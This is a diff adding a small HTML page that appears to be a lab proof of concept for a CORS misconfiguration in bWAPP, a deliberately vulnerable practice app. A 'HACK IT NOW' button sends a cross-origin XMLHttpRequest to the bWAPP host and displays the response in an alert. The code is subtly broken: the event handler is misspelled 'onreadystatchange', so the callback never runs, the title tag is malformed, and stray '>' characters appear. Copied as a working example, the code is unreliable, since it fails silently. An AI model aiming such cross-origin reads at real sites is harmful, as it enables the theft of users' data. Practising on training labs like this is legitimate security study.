@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+
+<!-- DON'T FORGET TO RESOLVE YOUR PRIVTE IP TO intranet.itsecgames.com-->
+<html>
+<head><title>AJAX</<title>></head>
+
+<body>
+<h3>CORS MISCONFIGURE</h3>
+
+<div>
+<button type="button" onclick=LOADSEC()>HACK IT NOW!!!!!!!!!!!!</button>>
+</div>
+
+
+<script> 
+	function LOADSEC(){
+		const HTTP = new XMLHttpRequest();
+		
+		HTTP.onreadystatchange = function(){
+		if (this.readyState == 4 && this.status == 200){
+			alert("RECIVED DATA {" + this.responseText +" }");}
+		}
+		HTTP.open("GET","https://bwapp.hakhub.net/");
+		HTTP.send();
+	}
+
+</script>
+</body>
+</html>
